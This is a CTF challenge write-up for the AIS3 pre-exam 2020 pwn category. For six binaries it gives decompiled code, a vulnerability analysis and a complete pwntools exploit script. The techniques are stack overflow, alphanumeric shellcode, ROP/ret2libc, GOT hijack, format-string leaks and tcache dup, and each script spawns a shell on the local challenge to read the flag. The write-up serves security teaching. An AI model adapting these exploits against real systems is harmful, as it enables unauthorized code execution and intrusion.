# AIS3 pre-exam 2020

## Setup

```
docker-compose up --build -d
```

(Optional) If you want to rebuild the challenges, check the `Makefile` and run:

```
make
```

## Challenge

### 👻 BOF - 189 Solves

> buffer overflow

#### Protection

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The same as the challenge last year and check out the awesome writeup [here](https://github.com/yuawn/ais3-2019-pre-exam#bof---139-solves).

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10000

r = remote(ip, port)
# r = process("./bof")

context.arch = "amd64"

ret = 0x400699
shell = 0x400687

r.sendlineafter(".", 'a' * 0x38 + flat(ret, shell))

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 📃 Nonsense - 47 Solves

> alphanumeric shellcode, out of bounds

#### Protection

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

#### Analysis

- main

Read the input in `unk_601100` and `unk_6010A0`, and then call `sub_400698`. If the return value is not zero it will take `unk_6010A0` as a function pointer and call it.

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  Z5nobufv();
  puts("Welcome to Rick and Morty's crazy world.");
  puts("What's your name?");
  read(0, &unk_601100, 0x10uLL);
  puts("Rick's stupid nonsense catchphrase is \"wubba lubba dub dub\".");
  puts("What's yours?");
  read(0, &unk_6010A0, 0x60uLL);
  if ( (unsigned int)sub_400698() )
    ((void (*)(void))unk_6010A0)();    // run shellcode
  else
    puts("Ummm, that's totally nonsense.");
  return 0LL;
}
```

- sub_400698

Check `unk_6010A0` contains only printable ASCII characters; in the meantime, check `byte_601040` "wubbalubbadubdub" string and it will cause out-of-bounds read. Dig into it. And you will find out that it will compare with `unk_601100` which you can control when it reads data out of bounds.

```c
__int64 sub_400698()
{
  int i; // [rsp+0h] [rbp-Ch]
  int v2; // [rsp+4h] [rbp-8h]
  int j; // [rsp+8h] [rbp-4h]

  for ( i = 0; i <= 95; ++i )
  {
    if ( byte_6010A0[i] <= 31 )
      return 0LL;
    v2 = 1;
    for ( j = 0; j <= 15; ++j )
    {
      if ( byte_6010A0[i + j] != byte_601040[j] )    // OOB read
        v2 = 0;
    }
    if ( v2 )
      return 1LL;
  }
  return 0LL;
}
```

#### Vulnerability

- the user input (`unk_601100` and `unk_6010A0`) are in RWX segment
- out-of-bounds read in `sub_400698`

#### Idea

Write the alphanumeric shellcode (< 96 bytes) and leverage OOB read to bypass the check if you need it. And you can see the available x86-64 instructions [here](https://nets.ec/Alphanumeric_shellcode) and construct the shellcode to get the shell. (there would be many ways to achieve it 😳)

**RR**Yh00AAX1A0hA004X1A4hA00AX1A8QX4**t**Pj0X40PZPjAX4znoNDnRYZnCXAwubbalubbadubdub

This is my solution based on the [shellcode](https://hama.hatenadiary.jp/entry/2017/04/04/190129) (60 bytes) with the modification to fix the address of “/bin/sh” and append the nonsense string at the end.

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10001

r = remote(ip, port)
# r = process("./nonsense")

context.arch = "amd64"

# https://hama.hatenadiary.jp/entry/2017/04/04/190129
payload = "RRYh00AAX1A0hA004X1A4hA00AX1A8QX4tPj0X40PZPjAX4znoNDnRYZnCXA"
nonsense = "wubbalubbadubdub"

name = "haha"
payload += nonsense

r.sendafter("?", name)
r.sendafter("?", payload)
time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 🔫 Portal gun - 28 Solves

> return oriented programming, ret2libc

#### Protection

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

#### Analysis

- main

It uses `gets` function that causes buffer overflow vulnerability.

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v4[112]; // [rsp+0h] [rbp-70h]

  Z5nobufv();
  puts("The Portal Gun is a gadget that allows the user(s) to travel between different universes/dimensions/realities.");
  puts("Where do you want to go?");
  gets(v4);    // buffer overflow
  return 0LL;
}
```

- hook.so

It hooks system function, and it just prints a string, not invoking a shell and executing a command.

```c
__int64 system()
{
  puts("** system function hook **");
  return 0LL;
}
```

#### Vulnerability

- buffer overflow with no limit input length

#### Idea

Use Return Oriented Programming (ROP) to leak the library base address and get the shell. And jump to the beginning of the main function to launch the ROP attack multiple times.

- leak the library base address
    - leverage `puts` function to print the function address of the library, and then subtract the offset to get the base address of the library.
- get the shell
    - figure out the real address of the `system` function and invoke `system("sh")`.
    - one gadget
    - ...

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10002

r = remote(ip, port)
# r = process("./portal_gun", env = {"LD_PRELOAD": "./hook.so"})
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

main = 0x4006fb
puts_plt = 0x400560
puts_got = 0x601018
pop_rdi = 0x4007a3

payload = 'a' * 120 + flat(pop_rdi, puts_got, puts_plt, main)

r.sendlineafter("?", payload)
r.recvline()
libc_base = u64(r.recvline()[:6].ljust(8, '\x00')) - libc.sym.puts

info("libc base: {}".format(hex(libc_base)))

magic = libc_base + 0x10a38c
payload = 'a' * 120 + flat(magic)
r.sendlineafter("?", payload)

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 🏫 Morty school - 14 Solves

> out of bounds, GOT hijack

#### Protection

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

#### Analysis

- sub_400C6D

It leaks the address of `puts`, and we can calculate the library base address easily 😂

```c
int sub_400C6D()
{
  puts("Welcome to Morty school ^_^");
  puts("We need you to teach Morty.");
  return printf("\nUseful information: %p\n\n", &puts);
}
```

- sub_400B80

There is no boundary check for `v4 = (__int64)&unk_6020A0 + v1` and if the value of `*(_QWORD *)(v4 + 16)` is not zero; then, we can write data in `*(void **)(v4 + 16)`. Besides, there is a buffer overflow vulnerability in the end.

```c
unsigned __int64 sub_400B80()
{
  int v1; // [rsp+8h] [rbp-88h]
  int v2; // [rsp+Ch] [rbp-84h]
  void *v3; // [rsp+10h] [rbp-80h]
  __int64 v4; // [rsp+18h] [rbp-78h]
  char buf[104]; // [rsp+20h] [rbp-70h]
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  puts("Which Morty you want to teach?");
  __isoc99_scanf("%d", &v1);
  v3 = &unk_6020A0;
  v1 *= 24;
  v4 = (__int64)&unk_6020A0 + v1;                   // no check for the boundary
  if ( *(_QWORD *)(v4 + 16) )
  {
    puts("Talk him the correct message:");
    v2 = read(0, *(void **)(v4 + 16), 0x100uLL);    // OOB write
    puts("Confirm again:");
    read(0, buf, 0x100uLL);                         // buffer overflow
  }
  return __readfsqword(0x28u) ^ v6;
}
```

#### Vulnerability

- out-of-bounds write in `sub_400B80`
- buffer overflow

#### Idea

Because the binary is partial RELRO, we could launch the GOT hijack. First, we need to figure out the function GOT address is in the memory or not.

In gdb-peda, you can use `find` to search the value:

```shell
gdb-peda$ find 0x602020
Searching for '0x602020' in: None ranges
Found 1 results, display max 1 items:
morty_school : 0x4005d0 --> 0x602020 --> 0x4006a6 (<__stack_chk_fail@plt+6>:	push   0x1)
```

And you can find all function GOT addresses in `[0x400528, 0x400658]`. Therefore, if you want to write the address X, find the pointer Y points to X. Then, calculate the offset to make `v4 = Y - 16`.

It has stack guard protection, and that means it will abort when the canary is wrong by calling `__stack_chk_fail`. So, I hook it as one gadget; then input a lot of null bytes to make the one gadget constraints hold and also overflow the buffer to trigger `__stack_chk_fail` which spawns a shell.

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10003

r = remote(ip, port)
# r = process("./morty_school")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

r.recvuntil(": ")
libc_base = int(r.recvline()[:-1], 16) - libc.sym.puts
info("libc base: {}".format(hex(libc_base)))

magic = libc_base + 0x10a38c

# (0x4005c0 - 0x6020a0) / 0x18
r.sendlineafter("teach?", str(-87668))
r.sendafter(":", p64(magic))
r.sendafter(":", "\x00" * 0x100)

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 🔮 Death crystal - 10 Solves

> format string

#### Protection

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

#### Analysis

- main

There is a format string vulnerability, and if `sub_97F(format)` returns non zero will trigger it.

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  char format[8]; // [rsp+0h] [rbp-30h]
  ...
  while ( 1 )
  {
    puts("Foresee:");
    *(_QWORD *)format = 0LL;
    v4 = 0LL;
    v5 = 0LL;
    v6 = 0LL;
    v7 = 0LL;
    __isoc99_scanf("%39s", format);
    if ( (unsigned int)sub_97F(format) )
      printf(format);    // format string
    puts(&byte_C9F);
  }
}
```

- sub_97F

If certain characters and formats contain, it will return zero.

```c
__int64 __fastcall sub_97F(__int64 a1)
{
  int v2; // [rsp+14h] [rbp-14h]
  int i; // [rsp+18h] [rbp-10h]
  int j; // [rsp+1Ch] [rbp-Ch]
  int k; // [rsp+20h] [rbp-8h]
  int l; // [rsp+24h] [rbp-4h]

  v2 = 0;
  for ( i = 0; *(_BYTE *)(i + a1); ++i )
  {
    for ( j = 0; j <= 3; ++j )
    {
      if ( *(_BYTE *)(i + a1) == byte_202010[j] )            // check
        return 0LL;
    }
    ++v2;
  }
  for ( k = 0; k < v2 - 1; ++k )
  {
    if ( *(_BYTE *)(k + a1) == '%' )
    {
      for ( l = 0; l <= 3; ++l )
      {
        if ( *(_BYTE *)(k + 1LL + a1) == byte_202014[l] )    // check
          return 0LL;
      }
    }
  }
  return 1LL;
}
```

More specificlly, if a null-terminated string contains `'$', '\', '/', '^'` characters or `"%c", "%p", "%n", "%h"` substrings, it will return zero.

```c
.data:0000000000202010 byte_202010     db '$', '\', '/', '^'
.data:0000000000202014 byte_202014     db 'c', 'p', 'n', 'h'
```

- sub_8DA

Read the flag in `unk_202060` which is in the bss section, that looks very kindful.

```c
int sub_8DA()
{
  FILE *stream; // [rsp+8h] [rbp-8h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  stream = fopen("/home/death_crystal/flag", "r");
  fread(&unk_202060, 0x40uLL, 1uLL, stream);
  return fclose(stream);
}
```

#### Vulnerability

- format string but block some certain characters

#### Idea

Leak the code base address and print the flag. Use `%llu` to print the full address (8 bytes) and use `%s` to print the flag.

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10004

r = remote(ip, port)
# r = process("./death_crystal")

context.arch = "amd64"

payload = "%d" * 11 + ".%llu"
r.sendlineafter(":", payload)

r.recvline()
code_base = int(r.recvline().split(".")[1]) - 0xb20
info("code base: {}".format(hex(code_base)))

flag = code_base + 0x202060
payload = flat("%d" * 8, ".%s.aaaa", p64(flag))
r.sendlineafter(":", payload)

r.interactive()
```

</details>

### 📦 Meeseeks box - 8 Solves

> use after free, tcache dup

#### Protection

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

#### Analysis

- sub_ED5

In delete function, it just frees the memory but does not set the pointer to null. So, we can show the freed memory by show function, and it causes use after free vulnerability.

```c
unsigned __int64 sub_ED5()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("ID: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0 && v1 <= 4 && *((_QWORD *)&unk_203060 + v1) )
    free(*((void **)&unk_203060 + v1));    // pointer dose not set to null
  puts("All done!");
  return __readfsqword(0x28u) ^ v2;
}
```

- sub_D17

We can malloc any size we want, and that is great!

```c
unsigned __int64 sub_D17()
{
  int v1; // [rsp+8h] [rbp-18h]
  int i; // [rsp+Ch] [rbp-14h]
  void *v3; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("I'm Mr. Meeseeks! Look at me!");
  printf("Size: ");
  __isoc99_scanf("%d", &v1);
  v3 = malloc(v1);
  printf("Request: ");
  __isoc99_scanf("%s", v3);
  for ( i = 0; i <= 4; ++i )
  {
    if ( !qword_203060[i] )
      qword_203060[i] = v3;
  }
  if ( rand() & 1 )
    puts("Yesiree!");
  else
    puts("Can do!");
  return __readfsqword(0x28u) ^ v4;
}
```

#### Vulnerability

- use after free

#### Idea

Free a large size chunk to get an unsorted bin and show the content to leak the library base address. Then we can use [tcache dup](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c) to write `__malloc_hook` as one gadget and call create function to trigger it.

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10005

r = remote(ip, port)
# r = process("./meeseeks_box")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

def Create(sz, data):
    r.sendlineafter(">", "1")
    r.sendlineafter(":", str(sz))
    r.sendlineafter(":", data)

def Show(idx):
    r.sendlineafter(">", "2")
    r.sendlineafter(":", str(idx))

def Delete(idx):
    r.sendlineafter(">", "3")
    r.sendlineafter(":", str(idx))

# unsorted bin
Create(0x900, 'aaaa')
Create(0x20, 'bbbb')
Delete(0)
Show(0)

libc_base = u64(r.recvline()[1:7].ljust(8, '\x00')) - 0x3ebca0
libc.address = libc_base
info("libc base: {}".format(hex(libc_base)))
magic = libc_base + 0x10a38c

# tcache dup
Create(0x20, 'cccc')
Delete(2)
Delete(2)
Create(0x20, p64(libc.sym.__malloc_hook))
Create(0x20, 'dddd')
Create(0x20, p64(magic))

# trigger __malloc_hook and pop the shell
r.sendlineafter(">", "1")
r.sendlineafter(":", "hack")
time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>


## Fun fact

- The easiest challenge 👻 BOF had been solved within 4 minutes after completion began by **qqgnoe466263**.
- A few people just submitted ```AIS3{TOO0O0O0O0OO0O0OOo0o0o0o00_EASY}```, and that is the flag of 👻 BOF last year. Such a nice try 🤪
- **LKK - Goburin'** got first blood on 🔫 Portal gun, 📃 Nonsense, 🏫 Morty school!
- **K1a - Goburin'** got first blood on 🔮 Death crystal and 📦 Meeseeks box!
- Congrats to **K1a - Goburin'**, **lys0829**, **hank0438**, **oalieno - r08921a06** and **LKK - Goburin'** for ALL KILL 💥 Pwn challenges!
